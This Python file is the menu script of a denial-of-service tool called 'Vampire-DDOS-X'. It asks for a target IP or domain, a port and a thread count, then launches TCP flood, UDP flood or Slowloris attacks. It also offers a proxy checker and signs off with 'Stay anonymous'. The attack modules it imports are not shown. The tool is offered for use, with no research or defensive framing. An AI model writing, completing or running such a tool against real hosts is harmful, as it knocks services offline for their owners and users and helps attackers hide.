import os
import time
from colorama import Fore
from attacks import tcp, udp, slowloris
import proxy_checker

def banner():
    os.system("clear")
    print(Fore.RED + r"""
██    ██  █████  ███    ███ ██████  ██ ██████  ███████     ██   ██
██    ██ ██   ██ ████  ████ ██   ██ ██ ██   ██ ██           ██ ██ 
██    ██ ███████ ██ ████ ██ ██████  ██ ██████  █████          ███  
██    ██ ██   ██ ██  ██  ██ ██   ██ ██ ██   ██ ██           ██ ██ 
 ██████  ██   ██ ██      ██ ██   ██ ██ ██   ██ ███████     ██   ██
          [ Vampire-DDOS-X ]  Coded by: Muhammad Shourov (VAMPIRE)
    """ + Fore.RESET)

def menu():
    banner()
    print(Fore.CYAN + "\n[1] TCP Flood Attack")
    print("[2] UDP Flood Attack")
    print("[3] Slowloris Attack")
    print("[4] Proxy Checker")
    print("[5] Exit" + Fore.RESET)
    choice = input(Fore.YELLOW + "\nSelect Option: " + Fore.RESET)

    if choice == "1":
        target = input("Target IP/Domain: ")
        port = int(input("Port: "))
        threads = int(input("Threads: "))
        tcp.start_attack(target, port, threads)
    elif choice == "2":
        target = input("Target IP/Domain: ")
        port = int(input("Port: "))
        threads = int(input("Threads: "))
        udp.start_attack(target, port, threads)
    elif choice == "3":
        target = input("Target IP/Domain: ")
        port = int(input("Port: "))
        threads = int(input("Sockets (recommend 100+): "))
        slowloris.start_attack(target, port, threads, proxies=None)
    elif choice == "4":
        proxy_file = input("Proxy File Path (e.g. proxies/proxy.txt): ")
        threads = int(input("Threads: "))
        proxy_checker.start_checking(proxy_file, threads)
    elif choice == "5":
        print(Fore.MAGENTA + "Exiting... Stay anonymous, Vampire!" + Fore.RESET)
        exit()
    else:
        print(Fore.RED + "Invalid Option!" + Fore.RESET)
        time.sleep(1)
        menu()

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Interrupted. Exiting..." + Fore.RESET)
